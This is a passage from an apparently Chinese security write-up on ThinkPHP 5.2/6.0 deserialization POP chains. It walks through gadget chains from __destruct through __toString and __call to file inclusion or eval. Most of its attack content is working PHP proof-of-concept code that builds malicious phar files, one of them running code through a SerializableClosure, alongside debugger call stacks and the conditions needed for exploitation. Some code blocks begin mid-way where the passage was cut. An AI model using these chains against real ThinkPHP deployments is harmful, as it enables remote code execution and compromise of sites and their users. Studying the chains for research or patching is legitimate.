$app为可控变量，直接修改$runtimePath的内容即可控制$app->getRuntimePath()的值
因此如下构造App对象
    class App{
    ​
        protected $runtimePath;
        public function __construct(string $rootPath = ''){
            $this->rootPath = $rootPath;
            $this->runtimePath = "/tmp/";
            $this->route = new \think\route\RuleName();
        }
这个思路也很赞啊！！！！师傅们太强了。
  1. vendor/topthink/framework/src/think/process/pipes/Windows.php __destruct ->removeFiles ->file_exists 强制转化字符串filename，这里的filename可控 可触发__toString函数，下一步找可利用的__toString
  2. vendor/topthink/framework/src/think/model/concern/Conversion.php__toString -> toJson -> toArray->appendAttrToArray->$relation调用不存在的函数，触发__call
  3. vendor/topthink/framework/src/think/Db.php__call -> new $class($this->connection) 调用任意类的__construct函数
  4. vendor/topthink/framework/src/think/Url.php构造App类，达到include任意文件的效果
POC：
    rootPath = $rootPath;
                $this->runtimePath = "/tmp/";
                $this->route = new \think\route\RuleName();
    ​
            }
        }
    ​
        class Db{
    ​
            protected $config = [];
            protected $connection;
    ​
            function __construct($connection){
                $this->config["query"] = "\\think\\Url";
                $this->connection = $connection;
            }
        }
    ​
    }
    ​
    ​
    namespace think\process\pipes {
    ​
        class Windows{
            private $files ;
            private $fileHandles = [];
    ​
            function __construct($files){
                $this->files = $files;
            }
        }
    }
    ​
    namespace think\model\concern{
        trait Conversion{
            protected $visible ;
            protected $hidden ;
            private $data ;
            private $relation ;
            protected $append ;
        }
    ​
    }
    namespace think{
    ​
        abstract class Model{
            use  \think\model\concern\Conversion ;
            public function __construct($relation){
                $this->visible = array('t'=>"fuck");
                $this->hidden = [];
                $this->data = [];
                $this->relation = array("x"=>$relation); 
                $this->append = array("x"=>array());
            }
        }
    ​
    }
    ​
    ​
    namespace think\model {
        class Pivot extends \think\Model{
            public function __construct($relation){
                parent::__construct($relation);
            }
        }
    }
    ​
    namespace {
        $connection = new \think\App();
        $relation = new \think\Db($connection);
        $pivot = new \think\model\Pivot($relation);
        $files = array("0"=>$pivot);
        $window = new \think\process\pipes\Windows($files);
        @unlink("phar5.phar");
        $phar = new Phar('phar5.phar');
        $phar -> startBuffering();
        $phar -> setStub('');   //设置stub，增加gif文件头
        $phar ->addFromString('test.txt','test');  //添加要压缩的文件
        $phar -> setMetadata($window);  //将自定义meta-data存入manifest
        $phar -> stopBuffering();
    }
这个POC的利用限制较大，不过思路很赞
    Url.php:43, think\Url->__construct()
    Db.php:203, think\Db->__call()
    Conversion.php:196, think\Db->append()
    Conversion.php:196, think\model\Pivot->appendAttrToArray()
    Conversion.php:179, think\model\Pivot->toArray()
    Conversion.php:252, think\model\Pivot->toJson()
    Conversion.php:268, think\model\Pivot->__toString()
    Windows.php:163, file_exists()
    Windows.php:163, think\process\pipes\Windows->removeFiles()
    Windows.php:59, think\process\pipes\Windows->__destruct()
调试过程：
在调用toarray之前的步骤和前面两个POC的调用是一样的
    Conversion.php:179, think\model\Pivot->toArray()
    Conversion.php:252, think\model\Pivot->toJson()
    Conversion.php:268, think\model\Pivot->__toString()
    Windows.php:163, file_exists()
    Windows.php:163, think\process\pipes\Windows->removeFiles()
    Windows.php:59, think\process\pipes\Windows->__destruct()
之后开始调用appendAttrToArray()
Conversion.php:196, think\model\Pivot->appendAttrToArray()
Conversion.php:196, think\Db->append()
Db对象尝试调用append方法，因为Db不存在append方法所以会触发__call()
Db.php:201, think\Db->__call()
    $query = new $class($this->connection);
Url.php:44, think\Url->__construct()
## 6.0.x （四）
tp在v6.0.x取消了Windos类，但是前面的利用链的函数动态调用的反序列化链后半部分仍然可以使用，意思是得寻找新的起点，从__destruct和__wakeup等等开始找起。
    data = array("wh1t3p1g"=>[]);
                    $this->relation = array("wh1t3p1g"=>[]);
                    $this->visible= array("wh1t3p1g"=>[]);
                    $this->withAttr = array("wh1t3p1g"=>$closure);
                }else{
                    $this->lazySave = true;
                    $this->withEvent = false;
                    $this->exists = true;
                    $this->force = true;
                    $this->data = array("wh1t3p1g"=>[]);
                    $this->connection = "mysql";
                    $this->suffix = $obj;
                }
    ​
            }
        }
    ​
    }
    ​
    namespace think\model {
        class Pivot extends \think\Model{
    ​
            function __construct($obj, $closure)
            {
                parent::__construct($obj, $closure);
            }
        }
    }
    ​
    namespace {
        require __DIR__ . '/../vendor/autoload.php';
        $code = 'phpinfo();';
        $func = function () use ($code) {eval($code);};
        $closure = new \Opis\Closure\SerializableClosure($func);
        $pivot1 = new \think\model\Pivot(null,$closure);
        $pivot2 = new \think\model\Pivot($pivot1,$closure);
        @unlink("phar6.phar");
        $phar = new Phar("phar6.phar"); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub("GIF89a"); //设置stub
        $phar->setMetadata($pivot2); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
        echo urlencode(serialize($pivot2));
    }
找一条可以触发toString的路径即可，在Model.php:503, think\model\Pivot->checkAllowFields()中
    protected function checkAllowFields(): array
    {
        // 检测字段
        if (empty($this->field)) {
            if (!empty($this->schema)) {
                $this->field = array_keys(array_merge($this->schema, $this->jsonType));
            } else {
                $query = $this->db();// 最终的触发__toString的函数
                $table = $this->table ? $this->table . $this->suffix : $query->getTable();
    ​
                $this->field = $query->getConnection()->getTableFields($table);
            }
    ​
            return $this->field;
        }
            // ...
    }
调用链如下，可以看到只是前半部分的调用链不一样，后面的利用__toString做跳板的调用链是一样的，太强了思路
    SerializableClosure.php:109, Opis\Closure\SerializableClosure->__invoke()
    Attribute.php:497, think\model\Pivot->getValue()
    Attribute.php:470, think\model\Pivot->getAttr()
    Conversion.php:173, think\model\Pivot->toArray()
    Conversion.php:244, think\model\Pivot->toJson()
    Conversion.php:249, think\model\Pivot->__toString()
    Model.php:297, think\model\Pivot->db()
    Model.php:503, think\model\Pivot->checkAllowFields()
    Model.php:559, think\model\Pivot->updateData()
    Model.php:474, think\model\Pivot->save()
    Model.php:978, think\model\Pivot->__destruct()
## 总结
有同学可能会疑问，找利用链之后怎么用呢，找到利用链只是一部分，还需要满足以下条件：
  1. 存在含有payload的phar文件，上传或者远程下载都可以。
  2. 存在反序列化的操作，这些操作不单单是unserialize还可以是文章中提到的包括LOAD DATA LOCAL INFILE等操作。
通过这四个POP的构造，也对thinkphp框架加深了理解，可以尝试尝试自己挖掘新的POP链~
## 参考
  1. 
  2. 
  3. [https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/?from=timeline&isappinstalled=0](https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/?from=timeline&isappinstalled=0)
  4. 